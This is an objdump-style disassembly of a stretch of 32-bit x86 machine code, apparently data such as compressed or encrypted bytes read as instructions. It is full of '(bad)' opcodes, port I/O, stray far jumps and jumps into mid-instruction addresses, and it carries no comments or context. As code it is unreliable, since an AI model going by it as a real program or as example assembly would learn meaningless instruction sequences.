  403809:	mov    ecx,0x471b72a2
  40380e:	or     eax,0x6858526f
  403813:	aaa    
  403814:	or     al,bh
  403816:	stos   BYTE PTR es:[edi],al
  403817:	outs   dx,DWORD PTR ds:[esi]
  403818:	fwait
  403819:	mov    al,0x93
  40381b:	jne    0x403817
  40381d:	retf   
  40381e:	mov    dh,0x1f
  403820:	stos   BYTE PTR es:[edi],al
  403821:	pushf  
  403822:	data16 or ch,BYTE PTR fs:[ebp-0x24879f8d]
  40382a:	lods   eax,DWORD PTR ds:[esi]
  40382b:	pushf  
  40382c:	repz pop esp
  40382e:	int    0xe5
  403830:	cmp    eax,DWORD PTR [ebp-0x47]
  403833:	mov    bh,0xfe
  403835:	lods   eax,DWORD PTR ds:[esi]
  403836:	mov    bh,0xed
  403838:	sbb    eax,0x97eadc6b
  40383d:	dec    esi
  40383e:	xchg   DWORD PTR [ebp-0x8161920],edx
  403844:	rol    DWORD PTR [ebx],0x92
  403847:	mov    eax,0x97da7113
  40384c:	mov    bh,0x58
  40384e:	xchg   ebx,eax
  40384f:	jbe    0x403839
  403851:	shl    DWORD PTR [ecx+ebx*8+0x6224f0a7],1
  403858:	outs   dx,BYTE PTR cs:[esi]
  40385a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40385b:	sar    DWORD PTR [esi],1
  40385d:	mov    al,0x36
  40385f:	adc    DWORD PTR [ecx],0x626fc142
  403865:	lahf   
  403866:	dec    esp
  403867:	push   ss
  403868:	sar    eax,0x27
  40386b:	add    ecx,ebx
  40386d:	test   al,0xb7
  40386f:	xchg   ebp,eax
  403870:	icebp  
  403871:	stc    
  403872:	add    eax,0xcc529696
  403877:	inc    edx
  403878:	jle    0x4038b7
  40387a:	pop    ss
  40387b:	and    bh,BYTE PTR [esi-0x4ae66319]
  403881:	in     al,dx
  403882:	je     0x4038ee
  403884:	mov    bl,0x2
  403886:	mov    al,0x88
  403888:	add    edx,DWORD PTR [bp-0x12]
  40388c:	imul   esi,DWORD PTR [edx-0x16],0xffffffcd
  403890:	aad    0x24
  403892:	scas   eax,DWORD PTR es:[edi]
  403893:	mov    al,ds:0x3e848894
  403898:	dec    esp
  403899:	lods   eax,DWORD PTR ds:[esi]
  40389a:	popf   
  40389b:	mov    eax,0x8ceb6eaf
  4038a0:	aad    0x8c
  4038a2:	sbb    cl,BYTE PTR [ebp-0x79]
  4038a5:	sti    
  4038a6:	gs (bad) 
  4038a8:	pop    ebx
  4038a9:	jmp    0x63eb:0xc9a5a6c3
  4038b0:	xor    bl,0xb5
  4038b3:	test   BYTE PTR [eax+ebx*1+0x32b11a25],dh
  4038ba:	xchg   dl,bh
  4038bc:	mov    cl,0x94
  4038be:	(bad)  
  4038bf:	pop    esp
  4038c0:	bound  ebx,QWORD PTR [edi+ebx*2]
  4038c3:	in     al,0x79
  4038c5:	mov    BYTE PTR [eax-0x23],0xfa
  4038c9:	xor    bh,0xbc
  4038cc:	or     esi,DWORD PTR [edx]
  4038ce:	sbb    DWORD PTR [edi],ebx
  4038d0:	jp     0x4038b5
  4038d2:	mov    edi,0x11bd4dfa
  4038d7:	outs   dx,DWORD PTR ds:[esi]
  4038d8:	add    al,0x45
  4038da:	cs mov al,0xbc
  4038dd:	inc    edi
  4038de:	push   cs
  4038df:	cmp    BYTE PTR [ebp+ecx*4-0x4f],cl
  4038e3:	push   cs
  4038e4:	pop    ebx
  4038e5:	test   ch,al
  4038e7:	jnp    0x403891
  4038e9:	pop    esi
  4038ea:	fbstp  TBYTE PTR [ecx+ecx*8-0x4d]
  4038ee:	scas   eax,DWORD PTR es:[edi]
  4038ef:	cld    
  4038f0:	xchg   edx,eax
  4038f1:	ror    BYTE PTR [eax-0x5e],1
  4038f4:	fidivr WORD PTR [ecx]
  4038f6:	mov    esp,0x355eefad
  4038fb:	test   DWORD PTR ds:0x6ab0dc0b,edi
  403901:	call   0x6f3d8fe7
  403906:	inc    edi
  403907:	cmp    ch,BYTE PTR [edi]
  403909:	xor    DWORD PTR [ebp+0x6c8231e6],esi
  40390f:	daa    
  403910:	out    dx,eax
  403911:	popa   
  403912:	pop    edx
  403914:	outs   dx,DWORD PTR ds:[esi]
  403915:	js     0x4038e4
  403917:	ds jge 0x403964
  40391a:	cmc    
  40391b:	mov    edx,0xa748bcc8
  403920:	popa   
  403921:	mov    al,es:0xdbc48881
  403927:	in     al,0x7f
  403929:	xchg   ebp,eax
  40392a:	and    BYTE PTR [esp+edx*4-0x6483afe1],dl
  403931:	stos   BYTE PTR es:[edi],al
  403932:	fnstcw WORD PTR [esp+edx*2-0x58aa28c1]
  403939:	mov    ebp,0xa531fe46
  40393e:	adc    al,0x7e
  403940:	xor    dl,BYTE PTR [edx]
  403942:	mov    al,0x4c
  403944:	pop    edx
  403945:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403946:	xchg   BYTE PTR ds:0x89f137fb,ah
  40394c:	or     bh,BYTE PTR [esi+0x64]
  40394f:	das    
  403950:	pop    ecx
  403951:	push   ecx
  403952:	lahf   
  403953:	mov    edx,ds
  403955:	cmp    BYTE PTR [edx],dh
  403957:	mov    esi,0x3653c4c2
  40395c:	adc    eax,DWORD PTR [ecx+0x301d66c4]
  403962:	push   esi
  403963:	pavgw  mm2,QWORD PTR [esi]
  403966:	add    BYTE PTR [edx],0xf9
  403969:	cmp    ecx,DWORD PTR fs:[ecx-0x6c]
  40396d:	or     BYTE PTR [ecx+0x60c17b39],bl
  403973:	inc    edx
  403974:	mov    db1,esp
  403977:	cwde   
  403978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403979:	test   eax,0x7704ed95
  40397e:	xor    DWORD PTR [ebp+ecx*8+0x2b7aca5c],edx
  403985:	popf   
  403986:	cmp    cl,bl
  403988:	shl    BYTE PTR [ecx-0x22c32fd9],cl
  40398e:	mov    eax,ds:0x32b3951a
  403993:	ss sub al,0x8b
  403996:	scas   al,BYTE PTR es:[edi]
  403997:	int3   
  403998:	jmp    0x4039ad
  40399a:	dec    edx
  40399b:	loope  0x40398b
  40399d:	sub    BYTE PTR [ebx+0x1dc9bbbf],al
  4039a3:	rcl    BYTE PTR [eax],cl
  4039a5:	out    0x1d,al
  4039a7:	xor    BYTE PTR [esi+0xce75e82],0xb
  4039ae:	fcom   st(2)
  4039b0:	mov    esi,0x508d1e2
  4039b5:	add    al,0xea
  4039b7:	add    bh,dl
  4039b9:	popf   
  4039ba:	adc    ebx,DWORD PTR [eax+eax*4-0xd71859a]
  4039c1:	nop
  4039c2:	jp     0x403a2f
  4039c4:	lds    esp,FWORD PTR ds:[esi+0x47]
  4039c8:	push   0x4490cca5
  4039cd:	or     eax,0x3b8394a4
  4039d2:	fadd   st(0),st
  4039d4:	mov    BYTE PTR [eax-0xaca3696],ch
  4039da:	push   esp
  4039db:	xor    BYTE PTR [ebp+ebx*1+0x874e6fa],bl
  4039e2:	ds fs jno 0x40398f
  4039e6:	cmp    BYTE PTR [edx],0xb2
  4039e9:	dec    ebp
  4039ea:	test   al,0x80
  4039ec:	sbb    esi,DWORD PTR [ebp+0x5cbc63de]
  4039f2:	push   esp
  4039f3:	les    ebx,FWORD PTR [ecx+eax*4-0x43]
  4039f7:	inc    edi
  4039f8:	call   0xa6:0xc50159ea
  4039ff:	fdiv   DWORD PTR [ecx+0x76]
  403a02:	fs ret 0x9af
  403a06:	or     al,0x98
  403a08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a09:	stos   BYTE PTR es:[edi],al
  403a0a:	mov    ah,0x44
  403a0c:	push   cs
  403a0d:	cwde   
  403a0e:	test   DWORD PTR [edx-0x2a3c9c71],esi
  403a14:	in     eax,0xde
  403a16:	int    0x37
  403a18:	js     0x403a59
  403a1a:	ins    DWORD PTR es:[edi],dx
  403a1b:	(bad)  [esi]
  403a1d:	ja     0x403a97
  403a1f:	cmp    ch,BYTE PTR [ebp-0x23]
  403a22:	cmp    ecx,DWORD PTR [edi+0x6c881752]
  403a28:	sub    DWORD PTR [ecx],eax
  403a2a:	pushw  ss
  403a2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a2d:	xor    al,0x17
  403a2f:	xchg   esp,eax
  403a30:	pop    ds
  403a31:	in     eax,0xf5
  403a33:	pop    es
  403a34:	push   cs
  403a35:	repnz int3 
  403a37:	fld    DWORD PTR [eax-0x327752ba]
  403a3e:	retf   0x90c4
  403a41:	sub    dh,bl
  403a43:	retf   
  403a44:	arpl   WORD PTR [ebx+esi*8],ax
  403a47:	push   es
  403a48:	pop    esp
  403a49:	jno    0x403ac7
  403a4b:	imul   eax,DWORD PTR [ecx+esi*8-0x19535f7c],0xf
  403a53:	push   edx
  403a54:	jne    0x403a1f
  403a56:	jnp    0x403a83
  403a58:	lahf   
  403a59:	jae    0x4039fe
  403a5b:	jb     0x403a2a
  403a5d:	outs   dx,BYTE PTR ds:[esi]
  403a5e:	fsub   DWORD PTR [eax]
  403a60:	nop
  403a61:	loop   0x403a02
  403a63:	adc    BYTE PTR [eax-0x4e],bl
  403a66:	xlat   BYTE PTR ds:[ebx]
  403a67:	sbb    BYTE PTR [edi+0x1bfab91e],0x42
  403a6e:	clc    
  403a6f:	or     ebx,DWORD PTR [ebx+0x631fe2a8]
  403a75:	scas   eax,DWORD PTR es:[edi]
  403a76:	xchg   esp,eax
  403a77:	mov    ebp,0x1067fd45
  403a7c:	jns    0x403a20
  403a7e:	jmp    0xe8ea1e9e
  403a83:	(bad)  
  403a85:	pushf  
  403a86:	jg     0x403acd
  403a88:	out    dx,eax
  403a89:	mov    ebp,0xa168bbde
  403a8e:	jne    0x403a37
  403a90:	ss iret 
  403a92:	sar    BYTE PTR [ebx-0x69297e18],0xf5
  403a99:	mov    esp,DWORD PTR [esi+ebx*8-0x31]
  403a9d:	add    esi,ebx
  403a9f:	sbb    edx,DWORD PTR [edx]
  403aa1:	outs   dx,BYTE PTR ds:[esi]
  403aa2:	mov    edi,0x62624fb2
  403aa7:	outs   dx,BYTE PTR ds:[esi]
  403aa8:	inc    edx
  403aa9:	inc    esp
  403aaa:	sbb    al,0xe8
  403aac:	dec    ecx
  403aad:	icebp  
  403aae:	cld    
  403aaf:	popa   
  403ab0:	pop    ecx
  403ab1:	sub    dh,al
  403ab3:	inc    esi
  403ab4:	sti    
  403ab5:	adc    bl,BYTE PTR [ebx]
  403ab7:	fcomp  DWORD PTR [ebp-0x3c5f95ae]
  403abd:	lds    edx,FWORD PTR [edi-0x38]
  403ac0:	dec    ebx
  403ac1:	mov    DWORD PTR [ebp+0x3b0d9a3c],edi
  403ac7:	adc    edi,ecx
  403ac9:	std    
  403aca:	dec    esp
  403acb:	div    dh
  403acd:	pop    ebp
  403ace:	jg     0x403b38
  403ad0:	inc    ebp
  403ad1:	jg     0x403b32
  403ad3:	dec    edi
  403ad4:	fnstsw WORD PTR ds:0x7e894e4b
  403ada:	popf   
  403adb:	cdq    
  403adc:	cs repz scas eax,DWORD PTR es:[edi]
  403adf:	daa    
  403ae0:	shl    DWORD PTR [ebx-0x23],1
  403ae3:	fld    QWORD PTR [edx+edx*4+0x0]
  403ae7:	push   cs
  403ae8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ae9:	xchg   ebp,eax
  403aea:	stos   DWORD PTR es:[edi],eax
  403aeb:	daa    
  403aec:	add    eax,0xa4fb66c6
  403af1:	push   esi
  403af2:	cmp    DWORD PTR [eax],esi
  403af4:	addr16 shl edx,0x4f
  403af8:	std    
  403af9:	sub    BYTE PTR [ebx],ch
  403afb:	pushf  
  403afc:	adc    DWORD PTR [edi+0x27],esp
  403aff:	icebp  
  403b00:	xor    BYTE PTR [edx-0x1cd1c435],ah
  403b06:	psraw  mm3,QWORD PTR [ecx]
  403b09:	mov    bl,0x16
  403b0b:	sub    DWORD PTR [eax+0x5],eax
  403b0e:	sbb    ch,0x95
  403b11:	jmp    0xbaa168e7
  403b16:	jmp    0x7c87:0xaf16e3ce
  403b1d:	stos   BYTE PTR es:[edi],al
  403b1e:	mov    bl,0x4a
  403b20:	dec    ebp
  403b21:	jmp    0xda182d9b
  403b26:	sub    ebx,ecx
  403b28:	adc    al,0x1a
  403b2a:	in     eax,0xf5
  403b2c:	ins    DWORD PTR es:[edi],dx
  403b2d:	(bad)  
  403b2e:	rcr    BYTE PTR [edi+0x61],1
  403b31:	out    0x76,eax
  403b33:	inc    esi
  403b34:	mov    al,0xfb
  403b36:	xor    eax,DWORD PTR [esi]
  403b38:	imul   ebp,DWORD PTR [esi],0x9dfe678f
  403b3e:	outs   dx,DWORD PTR ds:[esi]
  403b40:	out    0x4d,al
  403b42:	mov    BYTE PTR [edi],cl
  403b44:	sub    BYTE PTR [edx],0xa4
  403b47:	xchg   ecx,eax
  403b48:	sub    al,0x3d
  403b4a:	bound  ecx,QWORD PTR [esi+0x2e900444]
  403b50:	sti    
  403b51:	cmp    bl,BYTE PTR [edx+0x173e0cb2]
  403b57:	out    dx,eax
  403b58:	lds    esi,FWORD PTR [ebx+ebx*1+0x3f022554]
  403b5f:	lea    edx,[esi+0xe]
  403b62:	cmp    al,BYTE PTR [ecx-0x560f37a]
  403b68:	xchg   edx,eax
  403b69:	dec    eax
  403b6a:	or     DWORD PTR [ebx],0x851bdf29
  403b70:	imul   edx,DWORD PTR [esi-0x125e85ff],0x14
  403b77:	std    
  403b78:	jo     0x403b52
  403b7a:	jb     0x403afc
  403b7c:	push   eax
  403b7d:	retf   0x4a30
  403b80:	loope  0x403b39
  403b82:	sysexit 
  403b84:	mov    dh,0xf6
  403b86:	and    eax,0x4a92bfe5
  403b8b:	clc    
  403b8c:	inc    ebp
  403b8d:	sbb    al,0x81
  403b8f:	and    bl,ah
  403b91:	and    al,BYTE PTR [edi-0x4d]
  403b94:	stos   DWORD PTR es:[edi],eax
  403b95:	or     al,ah
  403b97:	sub    BYTE PTR [ecx+0xf56d7fd],bh
  403b9d:	pusha  
  403b9e:	pop    edi
  403b9f:	jne    0x403bf5
  403ba1:	pop    ds
  403ba2:	loop   0x403bdf
  403ba4:	inc    edi
  403ba5:	lods   al,BYTE PTR ds:[esi]
  403ba6:	ds mov cl,0x87
  403ba9:	imul   esi,edx,0x662deeb
  403baf:	dec    ecx
  403bb0:	xchg   DWORD PTR [esi-0x3d],esi
  403bb3:	sbb    bl,dl
  403bb5:	xchg   esi,eax
  403bb6:	jb     0x403bd1
  403bb8:	retf   
  403bb9:	ins    BYTE PTR es:[edi],dx
  403bba:	sub    BYTE PTR [edi+0x59],bl
  403bbd:	jmp    0xfea73f2f
  403bc2:	or     eax,0xad83160
  403bc7:	jmp    FWORD PTR [ebp-0x23]
  403bca:	mov    ds:0xbe64849c,eax
  403bcf:	cdq    
  403bd0:	cmc    
  403bd1:	cs loopne 0x403bf6
  403bd4:	nop/reserved BYTE PTR [ebx+0xb]
  403bd8:	fcmove st,st(4)
  403bda:	gs mov ebp,edx
  403bdd:	arpl   WORD PTR [edx],ax
  403bdf:	or     cl,dl
  403be1:	mov    DWORD PTR [edx],eax
  403be3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403be4:	aas    
  403be5:	inc    ebp
  403be6:	jnp    0x403c52
  403be8:	sbb    edx,esp
  403bea:	dec    esi
  403beb:	(bad)  
  403bec:	fisubr WORD PTR [edi-0xbfb6265]
  403bf2:	pop    eax
  403bf3:	and    esi,esp
  403bf5:	and    BYTE PTR [eax+0x76cd142c],al
  403bfb:	stc    
  403bfc:	(bad)  
  403bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bfe:	dec    ecx
  403bff:	cmp    al,0x92
  403c01:	inc    edi
  403c02:	mov    ch,0x9f
  403c04:	fisttp DWORD PTR [edi]
  403c06:	mov    bl,0xda
  403c08:	mov    dh,0xec
  403c0a:	lods   eax,DWORD PTR ds:[esi]
  403c0b:	cdq    
  403c0c:	pusha  
  403c0d:	mov    ds:0x6e8e078b,eax
  403c12:	mov    eax,0x82db49a0
  403c17:	clc    
  403c18:	std    
  403c19:	sub    bh,al
  403c1b:	fimul  WORD PTR [ebx+0x34]
  403c1e:	or     cl,ch
  403c20:	dec    ebx
  403c21:	dec    ebx
  403c22:	pop    esp
  403c23:	push   edx
  403c24:	iret   
  403c25:	ret    0x2dcb
  403c28:	into   
  403c29:	iret   
  403c2a:	xor    eax,0x3754c365
  403c2f:	jmp    0x7276:0x67773db1
  403c36:	pusha  
  403c37:	mov    ebp,0x6f4184b4
  403c3c:	cmp    DWORD PTR [ebp-0xa9e4d61],edi
  403c42:	xchg   ebx,eax
  403c43:	sub    DWORD PTR [edx+0x5],edi
  403c46:	cwde   
  403c47:	pop    ecx
  403c48:	test   ah,bl
  403c4a:	pushf  
  403c4b:	add    al,0x99
  403c4d:	cmp    DWORD PTR [edx],esp
  403c4f:	gs enter 0x96b6,0x4d
  403c54:	mov    WORD PTR ds:0xaecc9871,fs
  403c5a:	jecxz  0x403cba
  403c5c:	push   ds
  403c5d:	xchg   ecx,eax
  403c5e:	lods   eax,DWORD PTR ds:[esi]
  403c5f:	mov    esi,0xb744b43e
  403c64:	jmp    0xc4a869c8
  403c69:	inc    edi
  403c6a:	xchg   DWORD PTR [ebx-0x1b],ebp
  403c6d:	(bad)  
  403c6e:	stos   DWORD PTR es:[edi],eax
  403c6f:	dec    esp
  403c70:	aam    0xcf
  403c72:	pop    ss
  403c73:	xchg   ecx,eax
  403c74:	sbb    ah,BYTE PTR [esi-0x6bc14e4d]
  403c7a:	mov    edi,0x6681408b
  403c7f:	loope  0x403c45
  403c81:	fstp   QWORD PTR [eax]
  403c83:	or     DWORD PTR [edx+0x55],0xffffffb0
  403c87:	mov    BYTE PTR [eax],bl
  403c89:	sti    
  403c8a:	inc    ebp
  403c8b:	shr    DWORD PTR [ebx-0x25d57090],1
  403c91:	test   BYTE PTR [edx-0x1646e10],al
  403c97:	je     0x403cad
  403c99:	mov    ch,0x57
  403c9b:	(bad)  
  403c9c:	mov    edx,0x213f55d1
  403ca1:	push   ss
  403ca2:	in     al,dx
  403ca3:	inc    ebx
  403ca4:	and    esi,ecx
  403ca6:	adc    eax,0x10c4f172
  403cab:	add    al,0x4a
  403cad:	or     BYTE PTR [edx+edi*4-0x71ac756],bh
  403cb4:	data16 xchg BYTE PTR [edx-0x4c],bh
  403cb8:	sahf   
  403cb9:	pop    ecx
  403cba:	mov    cl,0x9a
  403cbc:	add    al,0x1
  403cbe:	(bad)  [edi-0x497e3f49]
  403cc4:	cmp    eax,0xbc0a8efb
  403cc9:	jbe    0x403ce3
  403ccb:	ffree  st(6)
  403ccd:	retf   0x69d5
  403cd0:	outs   dx,DWORD PTR ds:[esi]
  403cd1:	popf   
  403cd2:	icebp  
  403cd3:	fwait
  403cd4:	dec    ebp
  403cd5:	xchg   edx,eax
  403cd6:	cwde   
  403cd7:	push   ecx
  403cd8:	out    dx,al
  403cd9:	pushf  
  403cda:	xor    DWORD PTR [ebx-0x77c13855],0x24
  403ce1:	(bad)  
  403ce2:	and    DWORD PTR [esi],edx
  403ce4:	xor    esi,DWORD PTR [edi]
  403ce6:	(bad)  
  403ce7:	out    dx,al
  403ce8:	out    0xe5,al
  403cea:	lock pop es
  403cec:	mov    ds:0xd988b688,al
  403cf1:	pusha  
  403cf2:	call   0x91ff:0xd4907936
  403cf9:	cmp    BYTE PTR [esi+0x1],cl
  403cfc:	in     eax,dx
  403cfd:	imul   eax,DWORD PTR [ecx+0x3de02682],0x1c
  403d04:	fwait
  403d05:	repnz rol ecx,1
  403d08:	stos   DWORD PTR es:[edi],eax
  403d09:	or     ecx,ebx
  403d0b:	ins    DWORD PTR es:[edi],dx
  403d0c:	test   al,0x2a
  403d0e:	inc    edi
  403d0f:	sahf   
  403d10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d11:	mov    ebp,0xd703a1e9
  403d16:	ret    
  403d17:	cmc    
  403d18:	aam    0xae
  403d1a:	inc    ebx
  403d1b:	inc    esi
  403d1c:	shl    dl,0xaa
  403d1f:	jnp    0x403cae
  403d21:	jp     0x403ca9
  403d23:	adc    esi,edi
  403d25:	das    
  403d26:	xchg   ebp,eax
  403d27:	jle    0x403d9b
  403d29:	add    al,0xca
  403d2b:	and    eax,0x2c8ded30
  403d30:	push   ebp
  403d31:	arpl   WORD PTR [edx-0x148152ab],dx
  403d37:	aad    0x43
  403d39:	aad    0x4b
  403d3b:	dec    eax
  403d3c:	dec    edi
  403d3d:	push   ebp
  403d3e:	mov    ch,0xbe
  403d40:	jle    0x403cc3
  403d42:	rcr    BYTE PTR [ecx+0x354362ff],1
  403d48:	outs   dx,BYTE PTR ds:[esi]
  403d49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d4a:	mov    ecx,0x6972291d
  403d4f:	std    
  403d50:	pop    es
  403d51:	jecxz  0x403db0
  403d53:	fwait
  403d54:	pop    ecx
  403d55:	push   edi
  403d56:	in     eax,dx
  403d57:	jnp    0x403cf4
  403d59:	and    al,0x43
  403d5b:	stos   BYTE PTR es:[edi],al
  403d5c:	ss mov dh,0xb0
  403d5f:	in     al,dx
  403d60:	jg     0x403cef
  403d62:	gs lahf 
  403d64:	or     cl,BYTE PTR [esi-0x621c74eb]
  403d6a:	(bad)  
  403d6b:	popa   
  403d6c:	aad    0x79
  403d6e:	adc    DWORD PTR ds:0x567e61c0,edx
  403d74:	ins    BYTE PTR es:[edi],dx
  403d75:	fsubr  QWORD PTR [ebp+0x59ba7292]
  403d7b:	das    
  403d7c:	xchg   BYTE PTR [eax+0x44ea0142],ch
  403d82:	fisub  DWORD PTR [ecx+0x54043fe]
  403d88:	gs gs int 0xf9
  403d8c:	adc    eax,0xa0a69557
  403d91:	or     ebp,DWORD PTR [esi]
  403d93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d94:	lock add BYTE PTR [eax],ch
  403d97:	inc    eax
  403d98:	sbb    DWORD PTR [edi-0x8],edx
  403d9b:	repnz pop ebx
  403d9d:	dec    ebx
  403d9e:	inc    esp
  403d9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403da0:	push   0x27fe0177
  403da5:	fnstsw WORD PTR [eax-0x38266020]
  403dab:	sub    DWORD PTR ds:0x2e390d59,edi
  403db1:	add    ah,0x78
  403db4:	shl    bh,1
  403db6:	jg     0x403d75
  403db8:	das    
  403db9:	add    al,0x19
  403dbb:	pusha  
  403dbc:	out    dx,eax
  403dbd:	or     al,0x42
  403dbf:	(bad)  
  403dc1:	jmp    0x38e7:0x36d1303a
  403dc8:	fwait
  403dc9:	or     edi,DWORD PTR [edi]
  403dcb:	pop    es
  403dcc:	out    0xac,al
  403dce:	push   esp
  403dcf:	push   ds
  403dd0:	popa   
  403dd1:	push   ebp
  403dd2:	lods   al,BYTE PTR ds:[esi]
  403dd3:	sub    ah,BYTE PTR [ecx]
  403dd5:	push   ebp
  403dd6:	mov    ah,0x7
  403dd8:	xor    al,0xf
  403dda:	repnz push ebp
  403ddc:	and    BYTE PTR [edi+0x16],cl
  403ddf:	jecxz  0x403e3f
  403de1:	cmp    al,0xc0
  403de3:	jmp    0x983f:0x25c4ff21
  403dea:	push   0xb58d1cb6
  403def:	aaa    
  403df0:	aad    0x56
  403df2:	(bad)  
  403df3:	pop    esp
  403df4:	fcmovne st,st(3)
  403df6:	adc    DWORD PTR [esi],edi
  403df8:	push   ss
  403df9:	lods   eax,DWORD PTR ds:[esi]
  403dfa:	add    eax,0x7cded605
  403dff:	and    DWORD PTR [esi],edx
  403e01:	xor    DWORD PTR [ebx+0x35],ebp
  403e04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e05:	jb     0x403e59
  403e07:	(bad)  
  403e08:	in     al,0xa1
  403e0a:	push   cs
  403e0b:	mov    esp,0x244a78a2
  403e10:	aam    0x45
  403e12:	stos   DWORD PTR es:[edi],eax
  403e13:	ret    0x6b38
  403e16:	std    
  403e17:	inc    esp
  403e18:	xor    ah,BYTE PTR ds:0x4cd29535
  403e1e:	hlt    
  403e1f:	dec    ebp
  403e20:	push   edi
  403e21:	xchg   edx,eax
  403e22:	test   BYTE PTR [esi+0x2d54615f],al
  403e28:	cmp    BYTE PTR ds:0x47e4e257,cl
  403e2e:	sub    edi,ecx
  403e30:	pop    DWORD PTR [edx+0x27]
  403e33:	dec    edi
  403e34:	mov    DWORD PTR [edi+0x69],0xb9350e30
  403e3b:	jmp    0xe4c72193
  403e40:	push   edx
  403e41:	jg     0x403e01
  403e43:	outs   dx,BYTE PTR ds:[esi]
  403e44:	js     0x403eaa
  403e46:	jo     0x403deb
  403e48:	shl    BYTE PTR [ebx+0x61321f20],0x94
  403e4f:	mov    esp,0xa304c6a
  403e55:	out    0x7b,al
  403e57:	sub    eax,0x4f5572a6
  403e5c:	icebp  
  403e5d:	xchg   ch,bl
  403e5f:	in     eax,dx
  403e60:	add    eax,0xf5ad9f86
  403e65:	cmp    eax,0x184869de
  403e6a:	vpsubq xmm2,xmm4,XMMWORD PTR [edx+0x74ad6c6f]
  403e72:	and    DWORD PTR [edi],edx
  403e74:	push   0x95e9f606
  403e79:	rol    DWORD PTR [ebx+0x35],0xe6
  403e7d:	pop    ds
  403e7e:	push   ss
  403e7f:	xchg   DWORD PTR [eax+0x71],ecx
  403e82:	retf   
  403e83:	sub    DWORD PTR [ebx+0x1d],ebp
  403e86:	fidivr DWORD PTR [ebx+esi*8]
  403e89:	or     dh,bl
  403e8b:	cmp    eax,0x73659547
  403e90:	xor    DWORD PTR [edi*2-0x72153c0a],ebx
  403e97:	aaa    
  403e98:	std    
  403e99:	xor    DWORD PTR [ebx+0x53],0x24131f53
  403ea0:	aas    
  403ea1:	popf   
  403ea2:	aad    0xac
  403ea4:	scas   al,BYTE PTR es:[edi]
  403ea5:	jbe    0x403e63
  403ea7:	lock push ecx
  403ea9:	iret   
  403eaa:	test   BYTE PTR ds:0x1a01fca3,0xbb
  403eb1:	out    0xca,eax
  403eb3:	rol    BYTE PTR [ebx],cl
  403eb5:	int3   
  403eb6:	mov    edi,0xe7517ceb
  403ebb:	pop    ecx
  403ebc:	cwde   
  403ebd:	inc    edi
  403ebe:	or     dl,BYTE PTR [edi+0x389f5c87]
  403ec4:	loope  0x403eb3
  403ec6:	ja     0x403e85
  403ec8:	push   ecx
  403ec9:	and    al,0x0
  403ecb:	fidiv  WORD PTR [edx*4+0x6149216d]
  403ed2:	in     eax,dx
  403ed3:	into   
  403ed4:	jne    0x403f55
  403ed6:	sti    
  403ed7:	scas   eax,DWORD PTR es:[edi]
  403ed8:	dec    ebx
  403ed9:	push   edx
  403eda:	dec    eax
  403edb:	jbe    0x403ed7
  403edd:	pop    esp
  403ede:	cmp    eax,0x37f6c70d
  403ee3:	xchg   esi,eax
  403ee4:	pushf  
  403ee5:	push   es
  403ee6:	pusha  
  403ee7:	jno    0x403e8b
  403ee9:	jb     0x403f28
  403eeb:	out    dx,eax
  403eec:	add    edi,0xffffff86
  403eef:	hlt    
  403ef0:	adc    BYTE PTR [edx+edx*8],bh
  403ef3:	push   ss
  403ef4:	mov    ecx,0xbe9741cb
  403ef9:	sub    edi,DWORD PTR [ecx+0x4180f68c]
  403eff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f00:	inc    eax
  403f01:	jg     0x403f62
  403f03:	fcmovb st,st(2)
  403f05:	mov    eax,0xcb4e49b2
  403f0a:	and    al,0xd9
  403f0c:	test   edi,edi
  403f0e:	dec    edi
  403f0f:	(bad)  
  403f10:	loop   0x403f78
  403f12:	loop   0x403f7a
  403f14:	push   edi
  403f15:	xchg   ebp,eax
  403f16:	jp     0x403f62
  403f18:	push   esi
  403f19:	in     al,dx
  403f1a:	push   esp
  403f1b:	leave  
  403f1c:	or     eax,0x4c4b9ceb
  403f21:	sbb    DWORD PTR [edx-0x350fe33e],esi
  403f27:	xor    eax,0x8e05a6cf
  403f2c:	call   0x9099b624
  403f31:	push   edx
  403f32:	test   DWORD PTR [edi-0x60],ecx
  403f35:	push   ss
  403f36:	adc    al,0xd3
  403f38:	jo     0x403f44
  403f3a:	cmp    ecx,DWORD PTR [edx]
  403f3c:	stc    
  403f3d:	pop    esi
  403f3e:	jmp    0x4325:0xdff85c38
  403f45:	cmp    esp,DWORD PTR [eax-0x71840a18]
  403f4b:	and    eax,0x59764416
  403f50:	dec    edx
  403f51:	test   esi,ebp
  403f53:	pop    es
  403f54:	jbe    0x403f5c
  403f56:	xchg   esi,eax
  403f57:	idiv   DWORD PTR [esp+ebx*2+0x7664658f]
  403f5e:	mov    BYTE PTR [edx+0x2558b273],0xdb
  403f65:	fisttp DWORD PTR [edx+ecx*2+0xe]
  403f69:	lahf   
  403f6a:	imul   ebx,ebp,0xffffffe5
  403f6d:	pop    ebx
  403f6e:	adc    BYTE PTR [ebx+0x3c1ab125],0x63
  403f75:	(bad)
  403f78:	dec    ebp
  403f79:	int    0x8a
  403f7b:	xchg   DWORD PTR [ecx+0x31],ebp
  403f7e:	jb     0x403f76
  403f80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f81:	dec    esp
  403f82:	cmp    al,0xc8
  403f84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f85:	jg     0x403f2f
  403f87:	xchg   ebx,eax
  403f88:	jge    0x404006
  403f8a:	fild   DWORD PTR [eax]
  403f8c:	mov    ebp,0x7a9eb5c8
  403f91:	gs jecxz 0x403f88
  403f94:	pop    ds
  403f95:	mov    WORD PTR [eax-0x3c],?
  403f98:	push   ebp
  403f99:	cmp    BYTE PTR [edx+ebx*4-0x7eea0402],dh
  403fa0:	(bad)  
  403fa1:	jae    0x403f54
  403fa3:	test   edx,0x389e365c
